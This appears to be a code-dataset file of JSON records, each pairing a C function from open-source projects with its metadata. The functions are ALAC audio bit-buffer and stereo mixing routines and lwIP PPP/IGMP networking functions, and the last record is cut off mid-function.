{"docstring": "// 20-bit routines\n// - the 20 bits of data are left-justified in 3 bytes of storage but right-aligned for input/output predictor buffers\n", "func_signal": "void mix20( uint8_t * in, uint32_t stride, int32_t * u, int32_t * v, int32_t numSamples, int32_t mixbits, int32_t mixres )", "code": "{\n\tint32_t\t\tl, r;\n\tuint8_t *\tip = in;\n\tint32_t\t\t\tj;\n\n\tif ( mixres != 0 )\n\t{\n\t\t/* matrixed stereo */\n\t\tint32_t\t\tmod = 1 << mixbits;\n\t\tint32_t\t\tm2 = mod - mixres;\n\n\t\tfor ( j = 0; j < numSamples; j++ )\n\t\t{\n\t\t\tl = (int32_t)( ((uint32_t)ip[HBYTE] << 16) | ((uint32_t)ip[MBYTE] << 8) | (uint32_t)ip[LBYTE] );\n\t\t\tl = (l << 8) >> 12;\n\t\t\tip += 3;\n\n\t\t\tr = (int32_t)( ((uint32_t)ip[HBYTE] << 16) | ((uint32_t)ip[MBYTE] << 8) | (uint32_t)ip[LBYTE] );\n\t\t\tr = (r << 8) >> 12;\n\t\t\tip += (stride - 1) * 3;\n\n\t\t\tu[j] = (mixres * l + m2 * r) >> mixbits;\n\t\t\tv[j] = l - r;\n\t\t} \n\t}\n\telse\n\t{\n\t\t/* Conventional separated stereo. */\n\t\tfor ( j = 0; j < numSamples; j++ )\n\t\t{\n\t\t\tl = (int32_t)( ((uint32_t)ip[HBYTE] << 16) | ((uint32_t)ip[MBYTE] << 8) | (uint32_t)ip[LBYTE] );\n\t\t\tu[j] = (l << 8) >> 12;\n\t\t\tip += 3;\n\n\t\t\tr = (int32_t)( ((uint32_t)ip[HBYTE] << 16) | ((uint32_t)ip[MBYTE] << 8) | (uint32_t)ip[LBYTE] );\n\t\t\tv[j] = (r << 8) >> 12;\n\t\t\tip += (stride - 1) * 3;\n\t\t}\n\t}\n}", "path": "alac\\matrix_enc.c", "repo_name": "openairplay/node_airtunes", "stars": 261, "license": "bsd-2-clause", "language": "c", "size": 1555}
{"docstring": "// note: implementing this with some kind of \"count leading zeros\" assembly is a big performance win\n", "func_signal": "static inline int32_t lead( int32_t m )", "code": "{\n\tlong j;\n\tunsigned long c = (1ul << 31);\n\n\tfor(j=0; j < 32; j++)\n\t{\n\t\tif((c & m) != 0)\n\t\t\tbreak;\n\t\tc >>= 1;\n\t}\n\treturn (j);\n}", "path": "alac\\ag_dec.c", "repo_name": "openairplay/node_airtunes", "stars": 261, "license": "bsd-2-clause", "language": "c", "size": 1555}
{"docstring": "// BitBufferReadSmall\n//\n// Reads up to 8 bits\n", "func_signal": "uint8_t BitBufferReadSmall( BitBuffer * bits, uint8_t numBits )", "code": "{\n\tuint16_t\t\treturnBits;\n\t\n\t//Assert( numBits <= 8 );\n\t\n\treturnBits = (bits->cur[0] << 8) | bits->cur[1];\n\treturnBits = returnBits << bits->bitIndex;\n\t\n\tbits->bitIndex += numBits;\n\t\n\treturnBits = returnBits >> (16 - numBits);\n\t\n\tbits->cur\t\t+= (bits->bitIndex >> 3);\n\tbits->bitIndex\t&= 7;\n\t\n\t//Assert( bits->cur <= bits->end );\n\t\n\treturn (uint8_t)returnBits;\n}", "path": "alac\\ALACBitUtilities.c", "repo_name": "openairplay/node_airtunes", "stars": 261, "license": "bsd-2-clause", "language": "c", "size": 1555}
{"docstring": "// BitBufferWrite\n//\n", "func_signal": "void BitBufferWrite( BitBuffer * bits, uint32_t bitValues, uint32_t numBits )", "code": "{\n\tuint32_t\t\t\t\tinvBitIndex;\n\t\n\tRequireAction( bits != nil, return; );\n\tRequireActionSilent( numBits > 0, return; );\n\n\tinvBitIndex = 8 - bits->bitIndex;\n\n\twhile ( numBits > 0 )\n\t{\n\t\tuint32_t\t\ttmp;\n\t\tuint8_t\t\tshift;\n\t\tuint8_t\t\tmask;\n\t\tuint32_t\t\tcurNum;\n\n\t\tcurNum = MIN( invBitIndex, numBits );\n\n\t\ttmp = bitValues >> (numBits - curNum);\n\n\t\tshift  = (uint8_t)(invBitIndex - curNum);\n\t\tmask   = 0xffu >> (8 - curNum);\t\t// must be done in two steps to avoid compiler sequencing ambiguity\n\t\tmask <<= shift;\n\n\t\tbits->cur[0] = (bits->cur[0] & ~mask) | (((uint8_t) tmp << shift)  & mask);\n\t\tnumBits -= curNum;\n\n\t\t// increment to next byte if need be\n\t\tinvBitIndex -= curNum;\n\t\tif ( invBitIndex == 0 )\n\t\t{\n\t\t\tinvBitIndex = 8;\n\t\t\tbits->cur++;\n\t\t}\n\t}\n\n\tbits->bitIndex = 8 - invBitIndex;\n}", "path": "alac\\ALACBitUtilities.c", "repo_name": "openairplay/node_airtunes", "stars": 261, "license": "bsd-2-clause", "language": "c", "size": 1555}
{"docstring": "// BitBufferGetPosition\n//\n", "func_signal": "uint32_t BitBufferGetPosition( BitBuffer * bits )", "code": "{\n\tuint8_t *\t\tbegin;\n\t\n\tbegin = bits->end - bits->byteSize;\n\t\n\treturn ((uint32_t)(bits->cur - begin) * 8) + bits->bitIndex;\n}", "path": "alac\\ALACBitUtilities.c", "repo_name": "openairplay/node_airtunes", "stars": 261, "license": "bsd-2-clause", "language": "c", "size": 1555}
{"docstring": "// BitBufferReadOne\n//\n// Reads one byte\n", "func_signal": "uint8_t BitBufferReadOne( BitBuffer * bits )", "code": "{\n\tuint8_t\t\treturnBits;\n\n\treturnBits = (bits->cur[0] >> (7 - bits->bitIndex)) & 1;\n\n\tbits->bitIndex++;\n\t\n\tbits->cur\t\t+= (bits->bitIndex >> 3);\n\tbits->bitIndex\t&= 7;\n\t\n\t//Assert( bits->cur <= bits->end );\n\t\n\treturn returnBits;\n}", "path": "alac\\ALACBitUtilities.c", "repo_name": "openairplay/node_airtunes", "stars": 261, "license": "bsd-2-clause", "language": "c", "size": 1555}
{"docstring": "// 20-bit routines\n// - the 20 bits of data are left-justified in 3 bytes of storage but right-aligned for input/output predictor buffers\n", "func_signal": "void unmix20( int32_t * u, int32_t * v, uint8_t * out, uint32_t stride, int32_t numSamples, int32_t mixbits, int32_t mixres )", "code": "{\n\tuint8_t *\top = out;\n\tint32_t \t\tj;\n\n\tif ( mixres != 0 )\n\t{\n\t\t/* matrixed stereo */\n\t\tfor ( j = 0; j < numSamples; j++ )\n\t\t{\n\t\t\tint32_t\t\tl, r;\n\n\t\t\tl = u[j] + v[j] - ((mixres * v[j]) >> mixbits);\n\t\t\tr = l - v[j];\n\n\t\t\tl <<= 4;\n\t\t\tr <<= 4;\n\n\t\t\top[HBYTE] = (uint8_t)((l >> 16) & 0xffu);\n\t\t\top[MBYTE] = (uint8_t)((l >>  8) & 0xffu);\n\t\t\top[LBYTE] = (uint8_t)((l >>  0) & 0xffu);\n\t\t\top += 3;\n\n\t\t\top[HBYTE] = (uint8_t)((r >> 16) & 0xffu);\n\t\t\top[MBYTE] = (uint8_t)((r >>  8) & 0xffu);\n\t\t\top[LBYTE] = (uint8_t)((r >>  0) & 0xffu);\n\n\t\t\top += (stride - 1) * 3;\n\t\t}\n\t}\n\telse \n\t{\n\t\t/* Conventional separated stereo. */\n\t\tfor ( j = 0; j < numSamples; j++ )\n\t\t{\n\t\t\tint32_t\t\tval;\n\n\t\t\tval = u[j] << 4;\n\t\t\top[HBYTE] = (uint8_t)((val >> 16) & 0xffu);\n\t\t\top[MBYTE] = (uint8_t)((val >>  8) & 0xffu);\n\t\t\top[LBYTE] = (uint8_t)((val >>  0) & 0xffu);\n\t\t\top += 3;\n\n\t\t\tval = v[j] << 4;\n\t\t\top[HBYTE] = (uint8_t)((val >> 16) & 0xffu);\n\t\t\top[MBYTE] = (uint8_t)((val >>  8) & 0xffu);\n\t\t\top[LBYTE] = (uint8_t)((val >>  0) & 0xffu);\n\n\t\t\top += (stride - 1) * 3;\n\t\t}\n\t}\n}", "path": "alac\\matrix_dec.c", "repo_name": "openairplay/node_airtunes", "stars": 261, "license": "bsd-2-clause", "language": "c", "size": 1555}
{"docstring": "// BitBufferRead\n//\n", "func_signal": "uint32_t BitBufferRead( BitBuffer * bits, uint8_t numBits )", "code": "{\n\tuint32_t\t\treturnBits;\n\t\n\t//Assert( numBits <= 16 );\n\n\treturnBits = ((uint32_t)bits->cur[0] << 16) | ((uint32_t)bits->cur[1] << 8) | ((uint32_t)bits->cur[2]);\n\treturnBits = returnBits << bits->bitIndex;\n\treturnBits &= 0x00FFFFFF;\n\t\n\tbits->bitIndex += numBits;\n\t\n\treturnBits = returnBits >> (24 - numBits);\n\t\n\tbits->cur\t\t+= (bits->bitIndex >> 3);\n\tbits->bitIndex\t&= 7;\n\t\n\t//Assert( bits->cur <= bits->end );\n\t\n\treturn returnBits;\n}", "path": "alac\\ALACBitUtilities.c", "repo_name": "openairplay/node_airtunes", "stars": 261, "license": "bsd-2-clause", "language": "c", "size": 1555}
{"docstring": "// 32-bit routines\n// - note that these really expect the internal data width to be < 32 but the arrays are 32-bit\n// - otherwise, the calculations might overflow into the 33rd bit and be lost\n// - therefore, these routines deal with the specified \"unused lower\" bytes in the \"shift\" buffers\n", "func_signal": "void unmix32( int32_t * u, int32_t * v, int32_t * out, uint32_t stride, int32_t numSamples,\n\t\t\t\tint32_t mixbits, int32_t mixres, uint16_t * shiftUV, int32_t bytesShifted )", "code": "{\n\tint32_t *\top = out;\n\tint32_t\t\t\tshift = bytesShifted * 8;\n\tint32_t\t\tl, r;\n\tint32_t \t\tj, k;\n\n\tif ( mixres != 0 )\n\t{\n\t\t//Assert( bytesShifted != 0 );\n\n\t\t/* matrixed stereo with shift */\n\t\tfor ( j = 0, k = 0; j < numSamples; j++, k += 2 )\n\t\t{\n\t\t\tint32_t\t\tlt, rt;\n\n\t\t\tlt = u[j];\n\t\t\trt = v[j];\n\t\t\t\n\t\t\tl = lt + rt - ((mixres * rt) >> mixbits);\n\t\t\tr = l - rt;\n\n\t\t\top[0] = (l << shift) | (uint32_t) shiftUV[k + 0];\n\t\t\top[1] = (r << shift) | (uint32_t) shiftUV[k + 1];\n\t\t\top += stride;\n\t\t} \n\t}\n\telse\n\t{\n\t\tif ( bytesShifted == 0 )\n\t\t{\n\t\t\t/* interleaving w/o shift */\n\t\t\tfor ( j = 0; j < numSamples; j++ )\n\t\t\t{\n\t\t\t\top[0] = u[j];\n\t\t\t\top[1] = v[j];\n\t\t\t\top += stride;\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\t/* interleaving with shift */\n\t\t\tfor ( j = 0, k = 0; j < numSamples; j++, k += 2 )\n\t\t\t{\n\t\t\t\top[0] = (u[j] << shift) | (uint32_t) shiftUV[k + 0];\n\t\t\t\top[1] = (v[j] << shift) | (uint32_t) shiftUV[k + 1];\n\t\t\t\top += stride;\n\t\t\t}\n\t\t}\n\t}\n}", "path": "alac\\matrix_dec.c", "repo_name": "openairplay/node_airtunes", "stars": 261, "license": "bsd-2-clause", "language": "c", "size": 1555}
{"docstring": "// 24-bit routines\n// - the 24 bits of data are right-justified in the input/output predictor buffers\n", "func_signal": "void unmix24( int32_t * u, int32_t * v, uint8_t * out, uint32_t stride, int32_t numSamples,\n\t\t\t\tint32_t mixbits, int32_t mixres, uint16_t * shiftUV, int32_t bytesShifted )", "code": "{\n\tuint8_t *\top = out;\n\tint32_t\t\t\tshift = bytesShifted * 8;\n\tint32_t\t\tl, r;\n\tint32_t \t\tj, k;\n\n\tif ( mixres != 0 )\n\t{\n\t\t/* matrixed stereo */\n\t\tif ( bytesShifted != 0 )\n\t\t{\n\t\t\tfor ( j = 0, k = 0; j < numSamples; j++, k += 2 )\n\t\t\t{\n\t\t\t\tl = u[j] + v[j] - ((mixres * v[j]) >> mixbits);\n\t\t\t\tr = l - v[j];\n\n\t\t\t\tl = (l << shift) | (uint32_t) shiftUV[k + 0];\n\t\t\t\tr = (r << shift) | (uint32_t) shiftUV[k + 1];\n\n\t\t\t\top[HBYTE] = (uint8_t)((l >> 16) & 0xffu);\n\t\t\t\top[MBYTE] = (uint8_t)((l >>  8) & 0xffu);\n\t\t\t\top[LBYTE] = (uint8_t)((l >>  0) & 0xffu);\n\t\t\t\top += 3;\n\n\t\t\t\top[HBYTE] = (uint8_t)((r >> 16) & 0xffu);\n\t\t\t\top[MBYTE] = (uint8_t)((r >>  8) & 0xffu);\n\t\t\t\top[LBYTE] = (uint8_t)((r >>  0) & 0xffu);\n\n\t\t\t\top += (stride - 1) * 3;\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tfor ( j = 0; j < numSamples; j++ )\n\t\t\t{\n\t\t\t\tl = u[j] + v[j] - ((mixres * v[j]) >> mixbits);\n\t\t\t\tr = l - v[j];\n\n\t\t\t\top[HBYTE] = (uint8_t)((l >> 16) & 0xffu);\n\t\t\t\top[MBYTE] = (uint8_t)((l >>  8) & 0xffu);\n\t\t\t\top[LBYTE] = (uint8_t)((l >>  0) & 0xffu);\n\t\t\t\top += 3;\n\n\t\t\t\top[HBYTE] = (uint8_t)((r >> 16) & 0xffu);\n\t\t\t\top[MBYTE] = (uint8_t)((r >>  8) & 0xffu);\n\t\t\t\top[LBYTE] = (uint8_t)((r >>  0) & 0xffu);\n\n\t\t\t\top += (stride - 1) * 3;\n\t\t\t}\n\t\t}\n\t}\n\telse \n\t{\n\t\t/* Conventional separated stereo. */\n\t\tif ( bytesShifted != 0 )\n\t\t{\n\t\t\tfor ( j = 0, k = 0; j < numSamples; j++, k += 2 )\n\t\t\t{\n\t\t\t\tl = u[j];\n\t\t\t\tr = v[j];\n\n\t\t\t\tl = (l << shift) | (uint32_t) shiftUV[k + 0];\n\t\t\t\tr = (r << shift) | (uint32_t) shiftUV[k + 1];\n\n\t\t\t\top[HBYTE] = (uint8_t)((l >> 16) & 0xffu);\n\t\t\t\top[MBYTE] = (uint8_t)((l >>  8) & 0xffu);\n\t\t\t\top[LBYTE] = (uint8_t)((l >>  0) & 0xffu);\n\t\t\t\top += 3;\n\n\t\t\t\top[HBYTE] = (uint8_t)((r >> 16) & 0xffu);\n\t\t\t\top[MBYTE] = (uint8_t)((r >>  8) & 0xffu);\n\t\t\t\top[LBYTE] = (uint8_t)((r >>  0) & 0xffu);\n\n\t\t\t\top += (stride - 1) * 3;\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tfor ( j = 0; j < numSamples; j++ )\n\t\t\t{\n\t\t\t\tint32_t\t\tval;\n\n\t\t\t\tval = u[j];\n\t\t\t\top[HBYTE] = (uint8_t)((val >> 16) & 0xffu);\n\t\t\t\top[MBYTE] = (uint8_t)((val >>  8) & 0xffu);\n\t\t\t\top[LBYTE] = (uint8_t)((val >>  0) & 0xffu);\n\t\t\t\top += 3;\n\n\t\t\t\tval = v[j];\n\t\t\t\top[HBYTE] = (uint8_t)((val >> 16) & 0xffu);\n\t\t\t\top[MBYTE] = (uint8_t)((val >>  8) & 0xffu);\n\t\t\t\top[LBYTE] = (uint8_t)((val >>  0) & 0xffu);\n\n\t\t\t\top += (stride - 1) * 3;\n\t\t\t}\n\t\t}\n\t}\n}", "path": "alac\\matrix_dec.c", "repo_name": "openairplay/node_airtunes", "stars": 261, "license": "bsd-2-clause", "language": "c", "size": 1555}
{"docstring": "// BitBufferRewind\n//\n", "func_signal": "void BitBufferRewind( BitBuffer * bits, uint32_t numBits )", "code": "{\n\tuint32_t\tnumBytes;\n\t\n\tif ( numBits == 0 )\n\t\treturn;\n\t\n\tif ( bits->bitIndex >= numBits )\n\t{\n\t\tbits->bitIndex -= numBits;\n\t\treturn;\n\t}\n\t\n\tnumBits -= bits->bitIndex;\n\tbits->bitIndex = 0;\n\n\tnumBytes\t= numBits / 8;\n\tnumBits\t\t= numBits % 8;\n\t\n\tbits->cur -= numBytes;\n\t\n\tif ( numBits > 0 )\n\t{\n\t\tbits->bitIndex = 8 - numBits;\n\t\tbits->cur--;\n\t}\n\t\n\tif ( bits->cur < (bits->end - bits->byteSize) )\n\t{\n\t\t//DebugCMsg(\"BitBufferRewind: Rewound too far.\");\n\n\t\tbits->cur\t\t= (bits->end - bits->byteSize);\n\t\tbits->bitIndex\t= 0;\n\t}\n}", "path": "alac\\ALACBitUtilities.c", "repo_name": "openairplay/node_airtunes", "stars": 261, "license": "bsd-2-clause", "language": "c", "size": 1555}
{"docstring": "// 16-bit routines\n", "func_signal": "void unmix16( int32_t * u, int32_t * v, int16_t * out, uint32_t stride, int32_t numSamples, int32_t mixbits, int32_t mixres )", "code": "{\n\tint16_t *\top = out;\n\tint32_t \t\tj;\n\n\tif ( mixres != 0 )\n\t{\n\t\t/* matrixed stereo */\n\t\tfor ( j = 0; j < numSamples; j++ )\n\t\t{\n\t\t\tint32_t\t\tl, r;\n\n\t\t\tl = u[j] + v[j] - ((mixres * v[j]) >> mixbits);\n\t\t\tr = l - v[j];\n\n\t\t\top[0] = (int16_t) l;\n\t\t\top[1] = (int16_t) r;\n\t\t\top += stride;\n\t\t} \n\t}\n\telse\n\t{\n\t\t/* Conventional separated stereo. */\n\t\tfor ( j = 0; j < numSamples; j++ )\n\t\t{\n\t\t\top[0] = (int16_t) u[j];\n\t\t\top[1] = (int16_t) v[j];\n\t\t\top += stride;\n\t\t}\n\t}\n}", "path": "alac\\matrix_dec.c", "repo_name": "openairplay/node_airtunes", "stars": 261, "license": "bsd-2-clause", "language": "c", "size": 1555}
{"docstring": "// BitBufferByteAlign\n//\n", "func_signal": "void BitBufferByteAlign( BitBuffer * bits, int32_t addZeros )", "code": "{\n\t// align bit buffer to next byte boundary, writing zeros if requested\n\tif ( bits->bitIndex == 0 )\n\t\treturn;\n\n\tif ( addZeros )\n\t\tBitBufferWrite( bits, 0, 8 - bits->bitIndex );\n\telse\t\n\t\tBitBufferAdvance( bits, 8 - bits->bitIndex );\t\n}", "path": "alac\\ALACBitUtilities.c", "repo_name": "openairplay/node_airtunes", "stars": 261, "license": "bsd-2-clause", "language": "c", "size": 1555}
{"docstring": "// BitBufferUnpackBERSize\n//\n", "func_signal": "uint32_t BitBufferUnpackBERSize( BitBuffer * bits )", "code": "{\n\tuint32_t\t\tsize;\n\tuint8_t\t\ttmp;\n\t\n\tfor ( size = 0, tmp = 0x80u; tmp &= 0x80u; size = (size << 7u) | (tmp & 0x7fu) )\n\t\ttmp = (uint8_t) BitBufferReadSmall( bits, 8 );\n\t\n\treturn size;\n}", "path": "alac\\ALACBitUtilities.c", "repo_name": "openairplay/node_airtunes", "stars": 261, "license": "bsd-2-clause", "language": "c", "size": 1555}
{"docstring": "// note: implementing this with some kind of \"count leading zeros\" assembly is a big performance win\n", "func_signal": "static inline int32_t lead( int32_t m )", "code": "{\n\tlong j;\n\tunsigned long c = (1ul << 31);\n\n\tfor(j=0; j < 32; j++)\n\t{\n\t\tif((c & m) != 0)\n\t\t\tbreak;\n\t\tc >>= 1;\n\t}\n\treturn (j);\n}", "path": "alac\\ag_enc.c", "repo_name": "openairplay/node_airtunes", "stars": 261, "license": "bsd-2-clause", "language": "c", "size": 1555}
{"docstring": "// 32-bit routines\n// - note that these really expect the internal data width to be < 32 but the arrays are 32-bit\n// - otherwise, the calculations might overflow into the 33rd bit and be lost\n// - therefore, these routines deal with the specified \"unused lower\" bytes in the \"shift\" buffers\n", "func_signal": "void mix32( int32_t * in, uint32_t stride, int32_t * u, int32_t * v, int32_t numSamples,\n\t\t\tint32_t mixbits, int32_t mixres, uint16_t * shiftUV, int32_t bytesShifted )", "code": "{\n\tint32_t\t*\tip = in;\n\tint32_t\t\t\tshift = bytesShifted * 8;\n\tuint32_t\tmask  = (1ul << shift) - 1;\n\tint32_t\t\tl, r;\n\tint32_t\t\t\tj, k;\n\n\tif ( mixres != 0 )\n\t{\n\t\tint32_t\t\tmod = 1 << mixbits;\n\t\tint32_t\t\tm2;\n\n\t\t//Assert( bytesShifted != 0 );\n\n\t\t/* matrixed stereo with shift */\n\t\tm2 = mod - mixres;\n\t\tfor ( j = 0, k = 0; j < numSamples; j++, k += 2 )\n\t\t{\n\t\t\tl = ip[0];\n\t\t\tr = ip[1];\n\t\t\tip += stride;\n\n\t\t\tshiftUV[k + 0] = (uint16_t)(l & mask);\n\t\t\tshiftUV[k + 1] = (uint16_t)(r & mask);\n\t\t\t\n\t\t\tl >>= shift;\n\t\t\tr >>= shift;\n\n\t\t\tu[j] = (mixres * l + m2 * r) >> mixbits;\n\t\t\tv[j] = l - r;\n\t\t}\n\t}\n\telse\n\t{\n\t\tif ( bytesShifted == 0 )\n\t\t{\n\t\t\t/* de-interleaving w/o shift */\n\t\t\tfor ( j = 0; j < numSamples; j++ )\n\t\t\t{\n\t\t\t\tu[j] = ip[0];\n\t\t\t\tv[j] = ip[1];\n\t\t\t\tip += stride;\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\t/* de-interleaving with shift */\n\t\t\tfor ( j = 0, k = 0; j < numSamples; j++, k += 2 )\n\t\t\t{\n\t\t\t\tl = ip[0];\n\t\t\t\tr = ip[1];\n\t\t\t\tip += stride;\n\n\t\t\t\tshiftUV[k + 0] = (uint16_t)(l & mask);\n\t\t\t\tshiftUV[k + 1] = (uint16_t)(r & mask);\n\t\t\t\t\n\t\t\t\tl >>= shift;\n\t\t\t\tr >>= shift;\n\n\t\t\t\tu[j] = l;\n\t\t\t\tv[j] = r;\n\t\t\t}\n\t\t}\n\t}\n}", "path": "alac\\matrix_enc.c", "repo_name": "openairplay/node_airtunes", "stars": 261, "license": "bsd-2-clause", "language": "c", "size": 1555}
{"docstring": "/*\n * ipcp_input - Input IPCP packet.\n */\n", "func_signal": "static void ipcp_input(ppp_pcb *pcb, u_char *p, int len)", "code": "{\n    fsm *f = &pcb->ipcp_fsm;\n    fsm_input(f, p, len);\n}", "path": "src\\lwip-git\\netif\\ppp\\ipcp.c", "repo_name": "nekromant/esp8266-frankenstein", "stars": 315, "license": "None", "language": "c", "size": 3556}
{"docstring": "/**\n * Dump global IGMP groups list\n */\n", "func_signal": "void\nigmp_dump_group_list()", "code": "{ \n  struct igmp_group *group = igmp_group_list;\n\n  while (group != NULL) {\n    LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_dump_group_list: [%\"U32_F\"] \", (u32_t)(group->group_state)));\n    ip_addr_debug_print(IGMP_DEBUG, &group->group_address);\n    LWIP_DEBUGF(IGMP_DEBUG, (\" on if %p\\n\", group->netif));\n    group = group->next;\n  }\n  LWIP_DEBUGF(IGMP_DEBUG, (\"\\n\"));\n}", "path": "src\\lwip-esp\\core\\ipv4\\igmp.c", "repo_name": "nekromant/esp8266-frankenstein", "stars": 315, "license": "None", "language": "c", "size": 3556}
{"docstring": "/**\n * Report IGMP memberships for this interface\n *\n * @param netif network interface on which report IGMP memberships\n */\n", "func_signal": "void\nigmp_report_groups(struct netif *netif)", "code": "{\n  struct igmp_group *group = igmp_group_list;\n\n  LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_report_groups: sending IGMP reports on if %p\\n\", netif));\n\n  while (group != NULL) {\n    if (group->netif == netif) {\n      igmp_delaying_member(group, IGMP_JOIN_DELAYING_MEMBER_TMR);\n    }\n    group = group->next;\n  }\n}", "path": "src\\lwip-esp\\core\\ipv4\\igmp.c", "repo_name": "nekromant/esp8266-frankenstein", "stars": 315, "license": "None", "language": "c", "size": 3556}
{"docstring": "/**\n * Search for a group in the global igmp_group_list\n *\n * @param ifp the network interface for which to look\n * @param addr the group ip address to search for\n * @return a struct igmp_group* if the group has been found,\n *         NULL if the group wasn't found.\n */\n", "func_signal": "struct igmp_group *\nigmp_lookfor_group(struct netif *ifp, ip_addr_t *addr)", "code": "{\n  struct igmp_group *group = igmp_group_list;\n\n  while (group != NULL) {\n    if ((group->netif == ifp) && (ip_addr_cmp(&(group->group_address), addr))) {\n      return group;\n    }\n    group = group->next;\n  }\n\n  /* to be clearer, we return NULL here instead of\n   * 'group' (which is also NULL at this point).\n   */\n  return NULL;\n}", "path": "src\\lwip-esp\\core\\ipv4\\igmp.c", "repo_name": "nekromant/esp8266-frankenstein", "stars": 315, "license": "None", "language": "c", "size": 3556}
{"docstring": "/*\n * ipcp_addci - Add our desired CIs to a packet.\n * Called by fsm_sconfreq, Send Configure Request.\n */\n", "func_signal": "static void ipcp_addci(fsm *f, u_char *ucp, int *lenp)", "code": "{\n    ppp_pcb *pcb = f->pcb;\n    ipcp_options *go = &pcb->ipcp_gotoptions;\n    int len = *lenp;\n\n#define ADDCIADDRS(opt, neg, val1, val2) \\\n    if (neg) { \\\n\tif (len >= CILEN_ADDRS) { \\\n\t    u32_t l; \\\n\t    PUTCHAR(opt, ucp); \\\n\t    PUTCHAR(CILEN_ADDRS, ucp); \\\n\t    l = ntohl(val1); \\\n\t    PUTLONG(l, ucp); \\\n\t    l = ntohl(val2); \\\n\t    PUTLONG(l, ucp); \\\n\t    len -= CILEN_ADDRS; \\\n\t} else \\\n\t    go->old_addrs = 0; \\\n    }\n\n#if VJ_SUPPORT\n#define ADDCIVJ(opt, neg, val, old, maxslotindex, cflag) \\\n    if (neg) { \\\n\tint vjlen = old? CILEN_COMPRESS : CILEN_VJ; \\\n\tif (len >= vjlen) { \\\n\t    PUTCHAR(opt, ucp); \\\n\t    PUTCHAR(vjlen, ucp); \\\n\t    PUTSHORT(val, ucp); \\\n\t    if (!old) { \\\n\t\tPUTCHAR(maxslotindex, ucp); \\\n\t\tPUTCHAR(cflag, ucp); \\\n\t    } \\\n\t    len -= vjlen; \\\n\t} else \\\n\t    neg = 0; \\\n    }\n#endif /* VJ_SUPPORT */\n\n#define ADDCIADDR(opt, neg, val) \\\n    if (neg) { \\\n\tif (len >= CILEN_ADDR) { \\\n\t    u32_t l; \\\n\t    PUTCHAR(opt, ucp); \\\n\t    PUTCHAR(CILEN_ADDR, ucp); \\\n\t    l = ntohl(val); \\\n\t    PUTLONG(l, ucp); \\\n\t    len -= CILEN_ADDR; \\\n\t} else \\\n\t    neg = 0; \\\n    }\n\n#if LWIP_DNS\n#define ADDCIDNS(opt, neg, addr) \\\n    if (neg) { \\\n\tif (len >= CILEN_ADDR) { \\\n\t    u32_t l; \\\n\t    PUTCHAR(opt, ucp); \\\n\t    PUTCHAR(CILEN_ADDR, ucp); \\\n\t    l = ntohl(addr); \\\n\t    PUTLONG(l, ucp); \\\n\t    len -= CILEN_ADDR; \\\n\t} else \\\n\t    neg = 0; \\\n    }\n#endif /* LWIP_DNS */\n\n#if 0 /* UNUSED - WINS */\n#define ADDCIWINS(opt, addr) \\\n    if (addr) { \\\n\tif (len >= CILEN_ADDR) { \\\n\t    u32_t l; \\\n\t    PUTCHAR(opt, ucp); \\\n\t    PUTCHAR(CILEN_ADDR, ucp); \\\n\t    l = ntohl(addr); \\\n\t    PUTLONG(l, ucp); \\\n\t    len -= CILEN_ADDR; \\\n\t} else \\\n\t    addr = 0; \\\n    }\n#endif /* UNUSED - WINS */\n\n    ADDCIADDRS(CI_ADDRS, !go->neg_addr && go->old_addrs, go->ouraddr,\n\t       go->hisaddr);\n\n#if VJ_SUPPORT\n    ADDCIVJ(CI_COMPRESSTYPE, go->neg_vj, go->vj_protocol, go->old_vj,\n\t    go->maxslotindex, go->cflag);\n#endif /* VJ_SUPPORT */\n\n    ADDCIADDR(CI_ADDR, go->neg_addr, go->ouraddr);\n\n#if LWIP_DNS\n    ADDCIDNS(CI_MS_DNS1, go->req_dns1, go->dnsaddr[0]);\n\n    ADDCIDNS(CI_MS_DNS2, go->req_dns2, go->dnsaddr[1]);\n#endif /* LWIP_DNS */\n\n#if 0 /* UNUSED - WINS */\n    ADDCIWINS(CI_MS_WINS1, go->winsaddr[0]);\n\n    ADDCIWINS(CI_MS_WINS2, go->winsaddr[1]);\n#endif /* UNUSED - WINS */\n    \n    *lenp -= len;\n}", "path": "src\\lwip-git\\netif\\ppp\\ipcp.c", "repo_name": "nekromant/esp8266-frankenstein", "stars": 315, "license": "None", "language": "c", "size": 3556}
{"docstring": "/*\n * ipcp_finished - possibly shut down the lower layers.\n */\n", "func_signal": "static void ipcp_finished(fsm *f)", "code": "{\n\tppp_pcb *pcb = f->pcb;\n\tif (pcb->ipcp_is_open) {\n\t\tpcb->ipcp_is_open = 0;\n\t\tnp_finished(pcb, PPP_IP);\n\t}\n}", "path": "src\\lwip-git\\netif\\ppp\\ipcp.c", "repo_name": "nekromant/esp8266-frankenstein", "stars": 315, "license": "None", "language": "c", "size": 3556}
{"docstring": "/*\n * ipcp_reqci - Check the peer's requested CIs and send appropriate response.\n * Callback from fsm_rconfreq, Receive Configure Request\n *\n * Returns: CONFACK, CONFNAK or CONFREJ and input packet modified\n * appropriately.  If reject_if_disagree is non-zero, doesn't return\n * CONFNAK; returns CONFREJ if it can't return CONFACK.\n *\n * inp = Requested CIs\n * len = Length of requested CIs\n */\n", "func_signal": "static int ipcp_reqci(fsm *f, u_char *inp, int *len, int reject_if_disagree)", "code": "{\n    ppp_pcb *pcb = f->pcb;\n    ipcp_options *wo = &pcb->ipcp_wantoptions;\n    ipcp_options *ho = &pcb->ipcp_hisoptions;\n    ipcp_options *ao = &pcb->ipcp_allowoptions;\n    u_char *cip, *next;\t\t/* Pointer to current and next CIs */\n    u_short cilen, citype;\t/* Parsed len, type */\n#if VJ_SUPPORT\n    u_short cishort;\t\t/* Parsed short value */\n#endif /* VJ_SUPPORT */\n    u32_t tl, ciaddr1, ciaddr2;/* Parsed address values */\n    int rc = CONFACK;\t\t/* Final packet return code */\n    int orc;\t\t\t/* Individual option return code */\n    u_char *p;\t\t\t/* Pointer to next char to parse */\n    u_char *ucp = inp;\t\t/* Pointer to current output char */\n    int l = *len;\t\t/* Length left */\n#if VJ_SUPPORT\n    u_char maxslotindex, cflag;\n#endif /* VJ_SUPPORT */\n#if LWIP_DNS\n    int d;\n#endif /* LWIP_DNS */\n\n    /*\n     * Reset all his options.\n     */\n    BZERO(ho, sizeof(*ho));\n    \n    /*\n     * Process all his 